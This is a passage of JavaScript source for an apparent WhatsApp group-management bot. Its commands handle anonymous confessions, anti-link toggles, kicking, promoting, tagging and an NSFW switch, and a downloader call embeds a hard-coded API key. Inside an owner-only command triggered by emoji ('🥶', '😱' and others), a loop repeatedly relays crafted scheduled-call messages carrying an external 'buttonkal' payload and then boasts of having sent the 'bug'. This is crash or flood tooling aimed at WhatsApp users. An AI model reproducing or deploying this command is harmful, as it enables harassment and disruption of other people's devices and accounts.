if (text > 700) return replygcTzy(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await yudamods.onWhatsApp(num)
if (cekno.length == 0) return replygcTzy(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return replygcTzy(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return replygcTzy(`Can't Confess to bot number!!!`)
var nomor = m.sender

const Tzyconfesmsg = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`

await yudamods.sendMessage(num,
{ text: Tzyconfesmsg,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": ``,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`}}}, {quoted:m})

await yudamods.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : m })
lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return replygcTzy(lidt)
}
break
case 'leave':{
if (m.isGroup && TzyTheCreator && command == "leave") return yudamods.groupLeave(from)
if (m.isGroup) return replygcTzy("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return replygcTzy("You are not in the room")
replygcTzy("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") yudamods.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
case 'afk': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!text) return replygcTzy(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcTzy(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
yudamods.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!TzyTheCreator) return replygcTzy(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                yudamods.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'editinfo': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!q) return replygcTzy(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
yudamods.groupSettingUpdate(from, 'announcement')
replygcTzy(`Success Allows Only Admins To Send Messages To This Group`)
} else if (args[0] == 'open') {
yudamods.groupSettingUpdate(from, 'not_announcement')
replygcTzy(`Success Allows All Participants To Send Messages To This Group`)
} else {
replygcTzy(`Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args.length < 1) return replygcTzy('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcTzy(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcTzy('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcTzy('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replygcTzy('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcTzy('Success in turning on antivirus in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcTzy('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcTzy('Success in turning off antivirus this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return replygcTzy('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcTzy('Success in turning on nsfw in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcTzy('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcTzy('Success in turning off nsfw in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcTzy('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcTzy('Success in turning on youtube video antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcTzy('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcTzy('Success in turning off youtube video antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcTzy('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcTzy('Success in turning on youtube channel antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcTzy('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcTzy('Success in turning off youtube channel antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcTzy('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcTzy('Success in turning on instagram antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcTzy('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcTzy('Success in turning off instagram antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case '🥶': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
if (!TzyTheCreator) return replygcTzy('*khusus Premium*')
if (!args[0]) return replygcTzy(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283842204546`)
jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
yudamods.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcTzy2(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcTzy('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcTzy('Success in turning on facebook antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcTzy('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcTzy('Success in turning off facebook antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcTzy('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcTzy('Success in turning on telegram antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcTzy('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcTzy('Success in turning off telegram antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcTzy('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcTzy('Success in turning on tiktok antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcTzy('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcTzy('Success in turning off tiktok antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcTzy('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcTzy('Success in turning on twitter antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcTzy('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcTzy('Success in turning off twitter antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcTzy('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcTzy('Success in turning on all antilink in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcTzy('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcTzy('Success in turning off all antilink in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (antiToxic) return replygcTzy('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcTzy('Success in turning on antitoxic in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcTzy('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcTzy('Success in turning off antitoxic in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (antiWame) return replygcTzy('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcTzy('Success in turning on antiwame in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcTzy('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcTzy('Success in turning off antiwame in this group')
} else {
  await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return replygcTzy('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcTzy('Success in turning on antiwame in this group')
var groupe = await yudamods.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
yudamods.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcTzy('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcTzy('Success in turning off antiwame in this group')
} else {
await replygcTzy(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case 'leavegc': {
                if (!TzyTheCreator) return replygcTzy(mess.owner)
                await yudamods.groupLeave(m.chat).then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
            }
            break
case 'add': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yudamods.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
}
break
case 'closetime': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcTzy('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcTzy(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
yudamods.groupSettingUpdate(from, 'announcement')
replygcTzy(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return replygcTzy(mess.group)
                if (!isBotAdmins) return replygcTzy(mess.botAdmin)
                if (!isAdmins) return replygcTzy(mess.admin)
                if (!text) return replygcTzy('Enter the value enable/disable')
                if (args[0] === 'enable') {
                    await yudamods.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await yudamods.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcTzy('The message was not sent by a bot!')
                 yudamods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return replygcTzy(mess.group)
                if (!isBotAdmins) return replygcTzy(mess.botAdmin)
                let response = await yudamods.groupInviteCode(m.chat)
                yudamods.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcTzy('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcTzy(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
yudamods.groupSettingUpdate(from, 'not_announcement')
replygcTzy(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yudamods.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
}
break
    case 'setname': case 'setsubject': {
                if (!m.isGroup) return replygcTzy(mess.group)
                if (!isBotAdmins) return replygcTzy(mess.botAdmin)
                if (!isAdmins) return replygcTzy(mess.admin)
                if (!text) return replygcTzy('Text ?')
                await yudamods.groupUpdateSubject(m.chat, text).then((res) => replygcTzy(mess.success)).catch((err) => replygcTzy(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return replygcTzy(mess.group)
                if (!isBotAdmins) return replygcTzy(mess.botAdmin)
                if (!isAdmins) return replygcTzy(mess.admin)
                if (!text) return replygcTzy('Text ?')
                await yudamods.groupUpdateDescription(m.chat, text).then((res) => replygcTzy(mess.success)).catch((err) => replygcTzy(jsonformat(err)))
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
if (!quoted) return replygcTzy(`Where is the picture?`)
if (!/image/.test(mime)) return replygcTzy(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcTzy(`Send/Reply Image With Caption ${prefix + command}`)
var mediz = await yudamods.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(mediz)
await yudamods.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcTzy(`Success`)
} else {
var memeg = await yudamods.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcTzy(`Success`)
}
}
break
case 'promote': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yudamods.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yudamods.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
yudamods.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!isAdmins && !TzyTheCreator) return replygcTzy(mess.admin)
if (!isBotAdmins) return replygcTzy(mess.botAdmin)
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
yudamods.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcTzy(`Send/reply text with captions ${prefix + command}`)
replygcTzy(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcTzy(eb)
}
break
case 'dbinary': {
if (!q) return replygcTzy(`Send/reply text with captions ${prefix + command}`)
replygcTzy(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcTzy(db)
}
break
case 'fbdl': case 'facebook': {
if (!q) return replygcTzy(`Where's the link??`)
let anu = await fetchJson(`https://Tzyapi.onrender.com/api/dowloader/fbdown?url=${q}&apikey=a565ddca`)
